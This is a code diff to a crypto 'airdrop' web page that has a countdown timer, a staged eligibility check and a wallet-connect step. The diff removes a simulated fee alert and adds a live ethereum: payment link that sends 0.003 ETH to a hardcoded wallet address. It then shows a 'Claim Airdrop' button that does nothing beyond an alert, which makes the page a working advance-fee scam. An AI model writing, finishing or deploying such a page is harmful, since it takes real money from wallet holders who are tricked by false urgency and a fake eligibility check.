@@ -41,10 +41,11 @@ button:disabled{opacity:.5; cursor:not-allowed}
 .progress{height:8px; background:rgba(255,255,255,.15); border-radius:10px; overflow:hidden; margin-top:16px}
 .bar{height:100%; width:0%; background:linear-gradient(90deg,#7f5cff,#c77dff)}
 .addr{word-break:break-all; font-size:12px; margin-top:8px; opacity:.8; text-align:center; margin-bottom:10px}
-.payBtn{
+.payBtn, .claimBtn{
   margin-top:16px; padding:12px 0; width:100%; border:none; border-radius:12px;
   background:linear-gradient(90deg,#7f5cff,#c77dff); color:#fff; font-weight:600; cursor:pointer;
 }
+.claimBtn{display:none;}
 </style>
 </head>
 
@@ -66,11 +67,12 @@ button:disabled{opacity:.5; cursor:not-allowed}
     <div class="progress"><div class="bar" id="bar"></div></div>
     <div class="addr" id="fullAddress"></div>
     <button class="payBtn" id="payBtn" onclick="payFee()">Pay 0.003 ETH Network Fee</button>
+    <button class="claimBtn" id="claimBtn" onclick="claimAirdrop()">Claim Airdrop</button>
   </div>
 </div>
 
 <script>
-/* ========== TIMER 3 HOURS ========== */
+/* ================= TIMER 3 HOURS ================= */
 const endTime = Date.now() + 3*60*60*1000;
 const timerEl = document.getElementById("timer");
 function updateTimer(){
@@ -84,7 +86,7 @@ function updateTimer(){
 setInterval(updateTimer,1000);
 updateTimer();
 
-/* ========== WALLET CONNECT ========== */
+/* ================= WALLET ================= */
 let currentAddress = "";
 async function connectWallet(){
   if(!window.ethereum){
@@ -104,19 +106,21 @@ async function connectWallet(){
   }
 }
 
-/* ========== ELIGIBILITY POPUP ========== */
+/* ================= ELIGIBILITY POPUP ================= */
 function showEligibility(address){
   const modal = document.getElementById("modal");
   const bar = document.getElementById("bar");
   const text = document.getElementById("modalText");
   const addrEl = document.getElementById("fullAddress");
   const payBtn = document.getElementById("payBtn");
+  const claimBtn = document.getElementById("claimBtn");
 
   modal.style.display="flex";
   bar.style.width="0%";
   text.innerText="Checking eligibility…";
   addrEl.innerText="";
   payBtn.style.display="none";
+  claimBtn.style.display="none";
 
   let progress=0;
   const phases = ["Scanning wallet activity…","Validating eligibility…","Allocating airdrop…"];
@@ -136,11 +140,29 @@ function showEligibility(address){
   },500);
 }
 
-/* ========== SIMULATE FEE PAYMENT ========== */
+/* ================= PAY NETWORK FEE ================= */
 function payFee(){
   if(!currentAddress) return;
-  alert("Simulating network fee payment of 0.003 ETH for wallet:\n" + currentAddress);
-  // Here you can replace with an actual ethereum: URL to open wallet payment
+
+  const recipient = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";
+  const amountEth = "0.003";
+  const amountWei = "3000000000000000";
+
+  // Ethereum deep link
+  const url = `ethereum:${recipient}?value=${amountWei}`;
+  window.location.href = url; // Opens MetaMask / Trust Wallet for payment
+
+  // Show Claim button after "payment"
+  const claimBtn = document.getElementById("claimBtn");
+  claimBtn.style.display="block";
+
+  // Optional: hide pay button to prevent repeated clicks
+  document.getElementById("payBtn").style.display="none";
+}
+
+/* ================= CLAIM AIRDROP ================= */
+function claimAirdrop(){
+  alert("Airdrop claimed! (Simulation only)");
 }
 </script>
 
